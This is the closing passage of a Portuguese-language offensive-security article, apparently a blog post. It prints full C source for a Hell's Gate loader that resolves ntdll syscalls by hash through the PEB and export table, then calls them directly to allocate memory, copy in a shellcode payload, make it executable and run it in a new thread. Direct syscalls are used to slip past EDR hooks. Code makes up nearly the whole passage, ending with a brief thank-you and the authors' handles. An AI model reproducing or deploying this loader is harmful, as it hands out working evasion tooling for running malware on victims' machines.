	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

/*--------------------------------------------------------------------
  Funções Externas -> HellsGate.asm
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

INT wmain() {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Pega a NTDLL
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Acessa a EAT dentro da NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };
	
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	printf("[+]VX_TABLE= %p\n", Table);
	
	Payload(&Table);
	return 0x00;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Acessa o DOS Header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Acessa o NT Header
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Acessa a EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;
			
			WORD cw = 0;
			while (TRUE) {
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable) {
	NTSTATUS status = 0x00000000;

	printf("[+] Address of VX_TABLE: %p | [+] Addres Of HellsGate: %p | [+] Address Of HellDescent: %p\n", pVxTable, HellsGate, HellDescent);

	// Aloca memória pro shellcode
	PVOID lpAddress = NULL;
	//SIZE_T sDataSize = sizeof(shellcode);
	SIZE_T sDataSize = sizeof(payload);
	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);

	printf("[+] Allocated Shellcode : 0x%p in Adress: 0x%p \n", payload, lpAddress); 
	
	// Escreve pra memória
	VxMoveMemory(lpAddress, payload, sizeof(payload));

	// Muda as permissões da região da memória
	ULONG ulOldProtect = 0;
	HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

	printf("[!] Enjoy your direct syscalls little mage\n"); 

	// Cria a Thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	// Wait for 1 seconds
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
	status = HellDescent(hHostThread, FALSE, &Timeout);

	return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}
```

Obrigado a você que leu até aqui !

Esperamos ter expressado com clareza como a técnica funciona, e que você tire um bom proveito desse artigo.

1luv 

sorahed && spyware
